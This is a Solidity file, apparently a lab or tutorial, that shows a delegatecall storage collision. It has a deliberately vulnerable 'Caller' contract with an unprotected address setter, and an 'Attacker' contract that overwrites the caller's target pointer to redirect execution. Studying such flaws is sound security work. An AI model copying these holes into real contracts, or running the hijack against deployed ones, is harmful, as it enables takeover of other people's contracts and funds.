// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

contract Called{
	uint public number;
	event NumberChanged(address _from, uint newNumber);

	function changeNumber(uint newNumber) public{
		number = newNumber;
		emit NumberChanged(msg.sender, newNumber);
	}

}

contract Caller{
	address public called;
	uint public number;
	address public owner;

	constructor(address _called){
		called = _called;
		owner = msg.sender;
	}

	function delegateChangeNumber(uint newNumber) public{
		(bool success, ) = called.delegatecall(
			abi.encodeWithSignature("changeNumber(uint256)", newNumber)
		);

		require(success, "Delegate call failed");
	}

	function callChangeNumber(uint newNumber) public {
		(bool success, ) = called.call(
			abi.encodeWithSignature("changeNumber(uint256)", newNumber)
		);

		require(success, "Call Failed");
	}

	function changeCalledAddress(address newContract) public{
		called = newContract;
	}

}

interface TargetInterface {
    function delegateChangeNumber(uint newNumber) external;
}

contract Attacker {
    address public called;
    uint public number;
    address public owner;

    TargetInterface public target;
    event NumberChanged(address _from, uint newNumber);

    constructor(){
        target = TargetInterface(0xC5862Ba753F3DabC4120E9803c01e0B13D7905F2);
        owner = msg.sender;
    }

    function attact() public {
        target.delegateChangeNumber(uint256(uint160(address(this))));
    }

    function changeNumber(uint newNumber)public {
        number = newNumber + 10;
        emit NumberChanged(msg.sender, newNumber);
    }

}


